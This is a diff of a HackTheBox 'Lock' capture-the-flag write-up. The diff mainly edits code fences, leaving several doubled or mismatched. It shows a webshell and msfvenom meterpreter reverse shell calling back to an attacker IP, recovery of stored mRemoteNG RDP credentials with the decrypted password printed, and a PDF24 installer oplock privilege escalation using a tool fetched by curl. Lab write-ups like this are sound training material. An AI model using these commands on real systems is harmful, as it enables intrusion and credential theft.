@@ -5,7 +5,7 @@ categories: [HackTheBox Writeups]
 tags: [hackthebox, windows]
 ---
 
-```
+```bash
 ares@legion:~/Documents$ sudo nmap -sVC -A -T4 $target
 Nmap scan report for 10.129.234.64 (10.129.234.64)
 Host is up (0.051s latency).
@@ -119,8 +119,7 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 81.83 seconds
-```
-
+```bash
 http://10.129.234.64:3000 > download dev-scripts.git // Visist Commits > repos.py
 ![20251122210856.png](/assets/img/htb-writeups/Pasted image 20251122210856.png)
 
@@ -130,31 +129,28 @@ ares@legion:~/HackTheBox/Lock$ python3 repos.py http://10.129.234.64:3000
 Repositories:
 - ellen.freeman/dev-scripts
 - ellen.freeman/website
-```
-
+```bash
 We can commit to repo and add our own script 
-```
+```bash
 git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git          
-```
-
+```bash
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.97 LPORT=4444 -f aspx > rev.aspx
 
 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.97; set LPORT 4444; run"
-```
-
+```bash
 OR
 https://github.com/BlackArch/webshells
 cmdasp.aspx 
 
-```
+```bash
 git config --global user.email "ellen.freeman"
 git config --global user.name "ellen.freeman"
 git add cmdasp.aspx 
 git commit -m 'mhmmm donuts'   
 git push 
 ```
-
+```sql
 Visit - http://10.129.234.64/cmdasp.aspx
 
 Get-ChildItem .\ -Recurse | Select-String -Pattern "config|pass|password|conf|db|sql" -List
@@ -165,21 +161,20 @@ cd C:\Users\ellen.freeman\Documents & type config.xml
 <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
     <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
 </mrng:Connections>
-```
-
+```bash
+```python
 https://raw.githubusercontent.com/gquere/mRemoteNG_password_decrypt/refs/heads/master/mremoteng_decrypt.py
 
-```
+```bash
 ares@legion:~/HackTheBox/Lock$ python3 decrypt.py config.xml             
 Name: RDP/Gale
 Hostname: Lock
 Username: Gale.Dekarios
 Password: ty8wnW9qCKDosXo6
-```
-
+```bash
 ```
 xfreerdp3 /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6
-```
+```bash
 ![20251122223510.png](/assets/img/htb-writeups/Pasted image 20251122223510.png)
 
 Privesc:
@@ -201,22 +196,21 @@ called with SYSTEM privileges and performs a write action on the file
 setting an oplock on the file as soon as it gets read. To do that, one can use the  
 'SetOpLock.exe' tool from "https://github.com/googleprojectzero/symboliclink-testing-tools"  
 with the following parameters:  
-```
+```bash
+```python
 
-
-```
+```bash
 /home/ares/Documents/SymbolicLink-Testing-Tools
 python3 -m http.server 5001
 
  curl http://10.10.14.97:5001/SetOpLock.exe -o SetOpLock.exe
-```
-
+```bash
 ```
 PS C:\Users\gale.dekarios> .\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" -r
 
 // another ps tab 
 PS C:\_install> msiexec.exe /fa c:\_install\pdf24-creator-11.15.1-x64.msi
-```
+```bash
 wait for new tab pop-up
 
 ![20251122224506.png](/assets/img/htb-writeups/Pasted image 20251122224506.png)
